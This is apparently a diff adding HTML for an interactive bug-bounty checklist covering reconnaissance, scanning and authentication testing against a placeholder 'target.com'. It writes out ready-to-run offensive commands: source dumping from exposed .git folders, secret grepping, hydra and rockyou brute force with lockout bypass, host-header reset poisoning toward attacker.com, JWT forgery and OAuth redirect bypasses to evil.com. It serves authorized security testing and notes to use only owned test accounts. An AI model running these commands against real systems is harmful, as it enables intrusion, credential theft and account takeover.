+        <textarea class="notes-field" placeholder="e.g. Found 312 subdomains, GitHub secret in personal repo of eng 'john-dev' (AWS key), Shodan shows port 9200 open on 192.168.x.x..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═════════════════════ -->
+  <!-- PHASE 3 — Active Recon -->
+  <!-- ═════════════════════ -->
+  <div class="phase" id="phase-3">
+    <div class="phase-header" onclick="togglePhase('phase-3')">
+      <div class="phase-num">PHASE 03</div>
+      <div class="phase-title">Active Reconnaissance &amp; Content Discovery</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-3"></div></div><span id="pct-phase-3">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-3">
+
+        <div class="subsection-title">probe live hosts</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">HTTP probe all subdomains — title, status, tech detection</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -title -status-code -tech-detect -follow-redirects -threads 50 -o httpx-results.txt</div>
+            <div class="item-tool">httpx: go install github.com/projectdiscovery/httpx/cmd/httpx@latest</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Screenshot all live hosts — visual triage at scale, spot odd ones fast</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">gowitness file -f httpx-results.txt --screenshot-path ./screenshots/ --disable-db && gowitness report generate</div>
+            <div class="item-tool">gowitness — look for: admin panels, login pages, dev/staging apps, internal tools</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Intentionally trigger errors — wrong content-type, missing params, invalid JSON</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">Errors leak: framework version, language, DB type, internal paths. Try for every endpoint.</div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/endpoint -H "Content-Type: text/plain" -d "not json" | grep -iE "exception|stacktrace|error|at com\.|at org\."</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check Spring Boot Actuator endpoints — memory dumps and env vars</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">for ep in env beans heapdump threaddump logfile info mappings configprops; do echo -n "/actuator/$ep: "; curl -sk -o /dev/null -w "%{http_code}" https://target.com/actuator/$ep; echo; done</div>
+            <div class="item-sub">/actuator/env = ALL env vars including secrets. /actuator/heapdump = memory dump with credentials in plaintext.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check debug/profiling endpoints on all subdomains</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/debug,/console,/_debug,/phpinfo.php,/telescope,/__debug__/,/debugbar,/_profiler,/laravel-debugbar" -mc 200 -o debug-panels.txt</div>
+            <div class="item-tool">Laravel Telescope (/telescope), Symfony Profiler (/_profiler), Django Debug (/?debug), Rails console</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">content discovery</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Recursive directory brute-force on every live host</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,aspx,html,json,txt,xml -t 50 --depth 3 -o ferox-results.txt</div>
+            <div class="item-tool">feroxbuster (recursive), ffuf for speed — use both for coverage</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check /.git/ /.svn/ /.env on all subdomains — download entire source code</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/.git/HEAD,/.svn/entries,/.env,.env.backup,.env.local,.env.prod" -mc 200 -o exposed-sensitive.txt && cat exposed-sensitive.txt | while read url; do git-dumper "$url/.git/" ./dumped-$(echo $url | md5sum | head -c6)/; done</div>
+            <div class="item-tool">git-dumper: pip install git-dumper — exposed .git = full source code with all history</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check /.well-known/ — leaks auth config, JWK sets, security policy</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sk https://target.com/.well-known/openid-configuration && curl -sk https://target.com/.well-known/jwks.json && curl -sk https://target.com/.well-known/security.txt</div>
+            <div class="item-sub">openid-configuration reveals OAuth/OIDC endpoints. jwks.json leaks public signing keys for JWT analysis.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Fuzz backup file extensions on known filenames</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">ffuf -u https://target.com/index.FUZZ -w <(echo -e ".bak\n.old\n.backup\n.orig\n.copy\n.tmp\n.swp\n~\n.1\n.save") -mc 200 -o backup-files.txt</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check robots.txt, sitemap.xml, crossdomain.xml on every subdomain</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/robots.txt,/sitemap.xml,/crossdomain.xml,/clientaccesspolicy.xml" -mc 200 -sr -srd ./robots-dumps/</div>
+            <div class="item-sub">Devs put internal paths in robots.txt they think nobody reads. crossdomain.xml = Flash CORS = data leakage.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">javascript analysis</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Crawl and extract all JS files from the target</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">katana -u https://target.com -jc -d 5 -ef css,png,jpg,gif,ico -o crawled-urls.txt && cat crawled-urls.txt | grep "\.js$" | tee js-files.txt</div>
+            <div class="item-tool">katana (projectdiscovery) — also: echo target.com | hakrawler -js -depth 3</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Extract hidden API endpoints from all JS files</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">cat js-files.txt | xargs -I{} bash -c 'curl -sk {} | python3 linkfinder.py -i - -o cli 2>/dev/null' | grep -E "^/" | sort -u | tee js-endpoints.txt</div>
+            <div class="item-tool">linkfinder: python3 linkfinder.py -i https://target.com/app.js -o cli</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Search JS files for secrets, keys, tokens, internal IPs</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">cat js-files.txt | xargs -I{} curl -sk {} | grep -rE "(api_key|apikey|secret|token|password|AWS_|private_key|client_secret|localhost|127\.0\.0|192\.168|10\.0\.|internal)" | tee js-secrets.txt</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check Wayback Machine for old JS versions — may contain removed endpoints</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">waybackurls target.com | grep "\.js$" | sort -u | tee old-js-urls.txt && cat old-js-urls.txt | xargs -I{} bash -c 'echo "=== {} ===" && curl -sk {} | python3 linkfinder.py -i - -o cli 2>/dev/null'</div>
+            <div class="item-sub">Old JS on Wayback still has endpoints that are removed from UI but still active on the server.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Search JS for GraphQL schema, mutations, S3 bucket references</span></div>
+            <div class="item-cmd">cat js-files.txt | xargs -I{} curl -sk {} | grep -rE "(graphql|mutation|__schema|s3\.amazonaws|storage\.googleapis|blob\.core\.windows)" | sort -u</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">api & mobile discovery</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Find exposed Swagger/OpenAPI/GraphQL documentation</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/api-docs,/swagger.json,/swagger.yaml,/openapi.json,/openapi.yaml,/swagger-ui.html,/v1/api-docs,/graphql,/api/graphql,/v1/graphql" -mc 200 -o api-docs.txt</div>
+            <div class="item-sub">OpenAPI spec = complete map of all endpoints, parameters, and response structures.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Fuzz API versions — old versions often lack security controls</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">for ver in v1 v2 v3 v4 v0 beta internal dev test; do echo -n "api/$ver/users: "; curl -sk -o /dev/null -w "%{http_code}" "https://api.target.com/$ver/users"; echo; done</div>
+            <div class="item-sub">If /api/v3 is current, /api/v1 may have no auth, no rate limiting, no input validation.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Intercept mobile app traffic — finds API endpoints not in web app</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">adb shell settings put global http_proxy BURP_IP:8080 && adb shell am start -a android.intent.action.MAIN -n com.target.app/.MainActivity</div>
+            <div class="item-tool">Android: adb + Burp proxy. iOS: mitmproxy with SSL certificate installed. Mobile = less competition.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Decompile APK with jadx-gui for hidden endpoints and API keys</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">jadx-gui target.apk # Open in GUI → search for: target.com, /api/, api_key, secret, BASE_URL</div>
+            <div class="item-tool">jadx-gui: brew install jadx — finds entire API surface invisible from web browser</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Discover hidden parameters with Param Miner + arjun</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">arjun -u https://target.com/api/endpoint --include 'origin,referer' -o arjun-params.json</div>
+            <div class="item-tool">arjun: pip install arjun — also use Burp Param Miner extension (passive, runs as you browse)</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. /actuator/env accessible on api-internal.target.com, jadx found /api/v1/admin/users endpoint, 3 old JS endpoints still live on server..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════ -->
+  <!-- PHASE 4 — App Mapping & Burp Setup -->
+  <!-- ════════════════════════ -->
+  <div class="phase" id="phase-4">
+    <div class="phase-header" onclick="togglePhase('phase-4')">
+      <div class="phase-num">PHASE 04</div>
+      <div class="phase-title">App Mapping &amp; Burp Suite Setup</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-4"></div></div><span id="pct-phase-4">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-4">
+
+        <div class="subsection-title">mandatory feature mapping — do this before any exploitation</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">List every single feature of the application</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Registration, login, SSO, profile, password reset, upload, payment, messaging, export, import, admin, API keys, webhooks, invitations, org management, 2FA, reports...</div>
+            <div class="item-cmd note">Create features.txt — every unchecked feature is a potential untested bug</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Map every user role and what each can do vs cannot do</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Admin, staff, org-owner, member, guest, API user — every role boundary is a privilege escalation test surface.</div>
+            <div class="item-cmd note">Build role matrix: rows=actions, columns=roles — mark allowed/denied. Every "denied" cell = test target.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Identify all object types — every object = IDOR surface</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Orders, invoices, messages, documents, reports, tickets, projects, comments, attachments — list them all with their ID format.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Rank features by impact if broken — start at top</span></div>
+            <div class="item-sub">Payment flow, auth, admin actions, user data export = HIGHEST. Profile picture = LOWEST. Prioritize ruthlessly.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Create 3 test accounts — User A (attacker), User B (victim), Admin if possible</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">NEVER test IDOR or auth without two accounts. NEVER access real user data. Always use accounts you control.</div>
+            <div class="item-cmd note">Always request elevated test accounts in your program introduction message — most programs provide them</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">burp suite setup — configure before touching the app</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Lock Burp scope to target domain only — no noise</span></div>
+            <div class="item-cmd note">Burp → Target → Scope → Add target.com wildcard. Uncheck "Use advanced scope control" for simplicity.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Install and configure Autorize extension — automatic IDOR/auth testing</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Paste User A session cookie in Autorize config. Browse as User B. Every IDOR flagged automatically.</div>
+            <div class="item-tool">Burp BApp Store → Autorize — must-have for systematic authorization testing</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Install Param Miner, Logger++, JS Miner, Active Scan++</span></div>
+            <div class="item-sub">Param Miner: discovers hidden headers/params passively. Logger++: advanced filtering. JS Miner: auto-extracts endpoints from every JS file as you browse.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Browse the ENTIRE app as a normal user first — click everything</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Use every feature. Let Burp map the full sitemap. Check Burp sitemap after — catches XHR calls and background API requests your eyes missed.</div>
+            <div class="item-cmd note">Don't attack anything yet. Just map. Spend 30+ minutes purely understanding the app.</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / App Map</div>
+        <textarea class="notes-field" placeholder="e.g. 23 features identified, 4 user roles, test accounts created (userA@mailinator.com / userB@mailinator.com), Autorize configured..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════ -->
+  <!-- PHASE 5 — Scanning & Enumeration -->
+  <!-- ════════════════════════════ -->
+  <div class="phase" id="phase-5">
+    <div class="phase-header" onclick="togglePhase('phase-5')">
+      <div class="phase-num">PHASE 05</div>
+      <div class="phase-title">Scanning &amp; Enumeration</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-5"></div></div><span id="pct-phase-5">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-5">
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Full TCP port scan on in-scope IPs</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">nmap -sV -sC -p- --open -T4 -oA nmap-full TARGET_IP --min-rate 5000 -Pn</div>
+            <div class="item-tool">nmap — follow up interesting ports with targeted scripts: nmap -sV -p PORT --script=vuln TARGET_IP</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Fast masscan on entire ASN range — common service ports</span></div>
+            <div class="item-cmd">masscan -p 80,443,8080,8443,8888,3000,4000,5000,6443,9200,9090,6379,27017,5432,3306 --rate=10000 -iL asn-ranges.txt -oG masscan-results.txt</div>
+            <div class="item-tool">masscan — then httpx on all discovered HTTP ports</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Run full nuclei scan — community templates, medium+ severity</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">nuclei -l httpx-results.txt -t ~/nuclei-templates/ -es info -severity medium,high,critical -o nuclei-findings.txt -c 100 -rl 150 && nuclei -update-templates</div>
+            <div class="item-tool">nuclei: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check subdomain takeover across all subdomains</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">nuclei -l live-subs.txt -t ~/nuclei-templates/http/takeovers/ -o takeovers.txt && subzy run --targets live-subs.txt --concurrency 50</div>
+            <div class="item-tool">nuclei takeover templates + subzy — check CNAME to: Heroku, GitHub Pages, Netlify, Vercel, S3, Fastly</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check for dangling NS records — entire subdomain zone takeover</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">for sub in $(cat live-subs.txt); do ns=$(dig NS $sub +short); [ -z "$ns" ] || echo "$sub NS: $ns"; done | grep -v "target.com"</div>
+            <div class="item-sub">Subdomain delegated to external DNS provider whose account was deleted = full takeover of all subdomains under it.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check security headers — HSTS, CSP, X-Frame-Options, CORP</span></div>
+            <div class="item-cmd">curl -sI https://target.com | grep -iE "strict-transport|content-security-policy|x-frame-options|x-content-type|referrer-policy|permissions-policy"</div>
+            <div class="item-sub">Weak/missing CSP = XSS escalation. Missing X-Frame-Options = clickjacking. No HSTS = MITM.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check for exposed database admin panels on all subdomains</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/phpmyadmin,/adminer,/adminer.php,/pgadmin,/mongo-express,/redis-commander,/kibana,/grafana" -mc 200,301,302 -o db-panels.txt</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">DNS zone transfer attempt</span></div>
+            <div class="item-cmd">for ns in $(dig NS target.com +short); do dig AXFR target.com @$ns 2>/dev/null | grep -v ";" ; done | tee zone-transfer.txt</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check JSONP endpoints for data leakage via callback parameter</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">Look for ?callback= or ?jsonp= on authenticated endpoints — JSONP bypasses CORS and can leak sensitive data.</div>
+            <div class="item-cmd">cat gau-urls.txt | grep -E "callback=|jsonp=|cb=" | tee jsonp-candidates.txt</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. Nuclei found CVE-2024-XXXX, subdomain takeover on staging.target.com (Heroku), Grafana on monitoring.target.com no auth..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════ -->
+  <!-- PHASE 6 — Authentication Testing -->
+  <!-- ════════════════════════ -->
+  <div class="phase" id="phase-6">
+    <div class="phase-header" onclick="togglePhase('phase-6')">
+      <div class="phase-num">PHASE 06</div>
+      <div class="phase-title">Authentication Testing</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-6"></div></div><span id="pct-phase-6">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-6">
+
+        <div class="subsection-title">login & account enumeration</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Username enumeration via response differences (body, timing, status)</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">ffuf -u https://target.com/api/login -X POST -d '{"email":"FUZZ","password":"x"}' -H "Content-Type: application/json" -w usernames.txt -mc all -o user-enum.json -t 5</div>
+            <div class="item-sub">Compare: response time differences (&gt;100ms = user exists), body length, error message wording.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Account lockout bypass — X-Forwarded-For IP rotation per request</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">ffuf -u https://target.com/login -X POST -d "email=victim@target.com&password=FUZZ" -w rockyou.txt -H "X-Forwarded-For: §RANDOM§" -t 5 -o lockout-bypass.txt</div>
+            <div class="item-tool">Also try: X-Real-IP, X-Client-IP, True-Client-IP, Forwarded headers to bypass per-IP lockout</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Test default credentials on all admin panels and exposed services</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv https-post-form "target.com:/login:user=^USER^&pass=^PASS^:F=invalid"</div>
+            <div class="item-sub">Try manually: admin/admin, admin/password, admin/target123, root/root — hits more often than expected.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">password reset</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Password reset token entropy analysis — collect 20+ tokens and compare</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">for i in $(seq 1 20); do curl -s -X POST https://target.com/reset -d "email=test$i@mailinator.com" && sleep 1; done # Then collect and analyze tokens from email</div>
+            <div class="item-sub">Sequential or low-entropy tokens can be predicted. MD5(email) or MD5(timestamp) are common weak patterns.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Host header injection for password reset poisoning</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/reset -d "email=victim@target.com" -H "Host: attacker.com" -H "X-Forwarded-Host: attacker.com"</div>
+            <div class="item-sub">If reset link uses Host header to build URL → link sent to victim points to attacker.com → token stolen.</div>
+            <div class="item-tool">Also try: X-Original-Host, X-Forwarded-Server — use Burp Collaborator as attacker.com</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Password reset token — test expiry, reuse after use, no invalidation on new request</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">1) Get reset token 2) Use it 3) Try reusing it again. Also: generate new token, old one should be invalid.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">jwt & session</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">JWT: alg:none attack, RS256→HS256 confusion, weak secret brute-force</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">python3 jwt_tool.py TARGET_JWT -X a && python3 jwt_tool.py TARGET_JWT -X k -pk server.pub && python3 jwt_tool.py TARGET_JWT -C -d /usr/share/seclists/Passwords/Common-Credentials/rockyou.txt</div>
+            <div class="item-tool">jwt_tool: pip install jwt-tool — -X a = alg:none, -X k = key confusion, -C -d = crack secret</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">JWT claim tampering — change role:user to role:admin, add isAdmin:true</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">python3 jwt_tool.py TARGET_JWT -T # Tamper mode — modify any claim, re-sign with discovered secret</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Session fixation and invalidation — does session change after login? Invalidate on logout?</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">python3 -c "import requests; s=requests.Session(); pre=s.get('https://target.com').cookies; s.post('https://target.com/login',data={'u':'user','p':'pass'}); post=s.cookies; print('SAME' if pre==post else 'OK - changed')"</div>
+            <div class="item-sub">Session must change on login. Old session token must be invalid after logout.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">oauth & sso</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">OAuth flow — missing state parameter, CSRF on authorization endpoint</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -sk "https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com&response_type=code" # No state = CSRF attack possible</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">OAuth redirect_uri validation bypass — open redirect to steal auth code</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd note">Test: redirect_uri=https://target.com.evil.com, redirect_uri=https://evil.com%2F@target.com, redirect_uri=https://target.com/callback/../../../evil</div>
+            <div class="item-sub">Open redirect + OAuth = account takeover. Chain: RXSS → steal code → full ATO.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">OAuth token leakage in Referer header — implicit flow</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">In implicit flow (response_type=token), access token appears in URL fragment. If page loads external resource, token leaks in Referer header.</div>
